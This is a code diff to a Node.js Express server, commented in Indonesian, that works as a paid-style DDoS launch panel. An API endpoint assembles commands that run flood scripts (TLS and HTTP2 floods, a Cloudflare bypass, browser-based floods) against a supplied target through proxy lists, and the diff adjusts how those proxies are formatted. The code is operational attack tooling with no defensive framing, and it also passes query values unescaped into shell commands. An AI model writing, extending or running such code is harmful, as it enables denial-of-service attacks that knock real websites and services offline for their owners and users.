@@ -65,7 +65,7 @@ function verifyApiKey(req, res, next) {
     next();
 }
 
-// ==================== CLEAN PROXY FUNCTION ====================
+// ==================== CLEAN PROXY FUNCTION (KHUSUS TLSV2) ====================
 function cleanProxyUrl(proxy) {
     // Remove http://, https://, socks4://, socks5:// prefixes
     let cleanProxy = proxy.replace(/^(https?:\/\/|socks[45]:\/\/)/i, '');
@@ -93,37 +93,47 @@ async function updateProxies() {
             if (!line.trim()) continue;
             let proxy = line.trim();
 
-            // For TLSV2, clean the proxy (remove prefixes)
-            // We'll store clean proxies without prefixes
-            let cleanProxy = cleanProxyUrl(proxy);
-            proxies.push(cleanProxy);
+            // SIMPAN PROXY DENGAN PREFIX ASLI (untuk method TLS, CF, FAST, BROWSER)
+            // Jika tidak ada prefix, tambahkan http:// sebagai default
+            if (!proxy.includes('://')) {
+                proxy = `http://${proxy}`;
+            }
+            proxies.push(proxy);
         }
 
         const uniqueProxies = [...new Set(proxies)];
         fs.writeFileSync(PROXY_FILE, uniqueProxies.join('\n'));
-        console.log(`[PROXY] Loaded ${uniqueProxies.length} clean proxies (prefixes removed)`);
+        console.log(`[PROXY] Loaded ${uniqueProxies.length} proxies (with prefixes for normal methods)`);
         return uniqueProxies.length;
     } catch (err) {
         console.log(`[ERROR] Failed to download proxies: ${err.message}`);
         if (fs.existsSync(PROXY_FILE)) {
-            let proxies = fs.readFileSync(PROXY_FILE, 'utf8').split('\n').filter(p => p.trim());
-            // Clean existing proxies in file as well
-            proxies = proxies.map(p => cleanProxyUrl(p));
-            fs.writeFileSync(PROXY_FILE, proxies.join('\n'));
-            console.log(`[PROXY] Using ${proxies.length} clean proxies from local file`);
+            const proxies = fs.readFileSync(PROXY_FILE, 'utf8').split('\n').filter(p => p.trim());
+            console.log(`[PROXY] Using ${proxies.length} proxies from local file`);
             return proxies.length;
         }
         return 0;
     }
 }
 
-// Function to get clean proxies for TLSV2 specifically
+// ==================== FUNGSI KHUSUS UNTUK TLSV2 (CLEAN PROXY) ====================
 function getCleanProxiesForTLSV2() {
     if (!fs.existsSync(PROXY_FILE)) return [];
+
+    // Baca proxy dari file utama
     let proxies = fs.readFileSync(PROXY_FILE, 'utf8').split('\n').filter(p => p.trim());
-    // Ensure all proxies are clean
-    proxies = proxies.map(p => cleanProxyUrl(p));
-    return proxies;
+
+    // Clean proxy (hapus semua prefix http://, https://, socks4://, socks5://)
+    const cleanProxies = proxies.map(p => cleanProxyUrl(p));
+
+    // Simpan ke file temporary khusus TLSV2
+    const tlsv2ProxyFile = path.join(SCRIPTS_DIR, 'proxy_tlsv2_clean.txt');
+    fs.writeFileSync(tlsv2ProxyFile, cleanProxies.join('\n'));
+
+    console.log(`[TLSV2] Created clean proxy file with ${cleanProxies.length} proxies (no prefixes)`);
+    console.log(`[TLSV2] Example: ${cleanProxies[0] || 'none'}`);
+
+    return tlsv2ProxyFile;
 }
 
 // ==================== CREATE DEFAULT UA.TXT ====================
@@ -197,7 +207,7 @@ app.get('/api', verifyApiKey, async (req, res) => {
     let command = '';
     let scriptPath = '';
 
-    // Method TLS (TCP/TLS Flood via proxy)
+    // Method TLS (TCP/TLS Flood via proxy) - PAKAI PROXY DENGAN PREFIX
     if (normalizedMethod === 'tls') {
         scriptPath = path.join(SCRIPTS_DIR, 'TLS.js');
         if (!fs.existsSync(scriptPath)) {
@@ -205,26 +215,23 @@ app.get('/api', verifyApiKey, async (req, res) => {
         }
         const concurrent = 50;
         command = `node ${scriptPath} ${ip} ${parsedPort} ${PROXY_FILE} ${concurrent} ${parsedTime}`;
+        console.log(`[TLS] Using proxies with prefixes (http://, socks://, etc)`);
 
-        // Method TLSV2 (HTTP2 Flood via proxy with stable reconnect)
+        // Method TLSV2 (HTTP2 Flood via proxy) - KHUSUS PAKAI CLEAN PROXY (TANPA PREFIX)
     } else if (normalizedMethod === 'tlsv2') {
         scriptPath = path.join(SCRIPTS_DIR, 'TLSV2.js');
         if (!fs.existsSync(scriptPath)) {
             return res.status(404).json({ error: 'TLSV2.js not found' });
         }
 
-        // Get clean proxies specifically for TLSV2
-        const cleanProxies = getCleanProxiesForTLSV2();
-        const tempProxyFile = path.join(SCRIPTS_DIR, 'proxy_tlsv2_clean.txt');
-        fs.writeFileSync(tempProxyFile, cleanProxies.join('\n'));
+        // Dapatkan file proxy yang sudah dibersihkan (tanpa prefix)
+        const cleanProxyFile = getCleanProxiesForTLSV2();
+        const rateParam = 120;
+        command = `node ${scriptPath} ${target} ${parsedTime} ${rateParam} 8 ${cleanProxyFile}`;
 
-        const rateParam = 50;
-        command = `node ${scriptPath} ${target} ${parsedTime} ${rateParam} ${parsedThreads} ${tempProxyFile}`;
+        console.log(`[TLSV2] Using CLEAN proxies (without http://, https://, socks4://, socks5:// prefixes)`);
 
-        console.log(`[TLSV2] Using clean proxies (without http://, https://, socks:// prefixes)`);
-        console.log(`[TLSV2] Sample clean proxy: ${cleanProxies[0] || 'none'}`);
-
-        // Method CF (Cloudflare Bypass - HTTP2 with proxy)
+        // Method CF (Cloudflare Bypass) - PAKAI PROXY DENGAN PREFIX
     } else if (normalizedMethod === 'cf') {
         scriptPath = path.join(SCRIPTS_DIR, 'CF-BYPASS.js');
         if (!fs.existsSync(scriptPath)) {
@@ -235,8 +242,9 @@ app.get('/api', verifyApiKey, async (req, res) => {
         const randomLength = 10;
         const randomType = 'y';
         command = `node ${scriptPath} ${methodType} ${target} ${parsedTime} ${parsedThreads} ${rateParam} ${PROXY_FILE} ${randomLength} ${randomType}`;
+        console.log(`[CF] Using proxies with prefixes`);
 
-        // Method FAST / H2-FAST (Advanced HTTP2 Flood with AI fingerprint)
+        // Method FAST / H2-FAST - PAKAI PROXY DENGAN PREFIX
     } else if (normalizedMethod === 'fast' || normalizedMethod === 'h2fast') {
         scriptPath = path.join(SCRIPTS_DIR, 'CF-BYPASS.js');
         if (!fs.existsSync(scriptPath)) {
@@ -265,7 +273,9 @@ app.get('/api', verifyApiKey, async (req, res) => {
         if (req.query.cache === 'false') command += ` --cache false`;
         if (req.query.referer) command += ` --referer ${req.query.referer}`;
 
-        // Method BROWSER (Browser Engine - Real browser simulation)
+        console.log(`[FAST] Using proxies with prefixes`);
+
+        // Method BROWSER - PAKAI PROXY DENGAN PREFIX
     } else if (normalizedMethod === 'browser') {
         scriptPath = path.join(SCRIPTS_DIR, 'Browser.js');
         if (!fs.existsSync(scriptPath)) {
@@ -277,6 +287,7 @@ app.get('/api', verifyApiKey, async (req, res) => {
         command = `node ${scriptPath} ${target} ${parsedTime} ${parsedBrowserCount} ${httpVersion} ${parsedConnTimeout} ${parsedRps} ${PROXY_FILE}`;
 
         console.log(`[BROWSER] Browser Count: ${parsedBrowserCount}, Timeout: ${parsedConnTimeout}ms, RPS: ${parsedRps}`);
+        console.log(`[BROWSER] Using proxies with prefixes`);
 
     } else {
         return res.status(400).json({
@@ -307,7 +318,8 @@ app.get('/api', verifyApiKey, async (req, res) => {
             conn_timeout: parsedConnTimeout,
             rps: parsedRps
         }),
-        proxies: proxyCount
+        proxies: proxyCount,
+        proxy_type: normalizedMethod === 'tlsv2' ? 'clean (no prefixes)' : 'with prefixes'
     });
 });
 
@@ -320,7 +332,11 @@ app.get('/health', (req, res) => {
         proxies: proxyCount,
         ping_enabled: PING_ENABLED,
         ping_url: `https://${SERVER_DOMAIN}`,
-        available_methods: ['tls', 'tlsv2', 'cf', 'fast', 'browser']
+        available_methods: ['tls', 'tlsv2', 'cf', 'fast', 'browser'],
+        proxy_rules: {
+            tlsv2: 'Clean proxies (no http://, https://, socks4://, socks5://)',
+            others: 'Proxies with prefixes (as downloaded)'
+        }
     });
 });
 
@@ -331,6 +347,10 @@ app.listen(PORT, () => {
     console.log(`Port: ${PORT}`);
     console.log(`API Key: ${API_KEY}`);
     console.log(`Methods: tls, tlsv2, cf, fast, browser`);
+    console.log(`========================================`);
+    console.log(`Proxy Rules:`);
+    console.log(`  - TLSV2: CLEAN proxies (without http://, https://, socks4://, socks5://)`);
+    console.log(`  - TLS, CF, FAST, BROWSER: Proxies WITH prefixes (as downloaded)`);
     console.log(`========================================\n`);
 
     createDefaultUaFile();
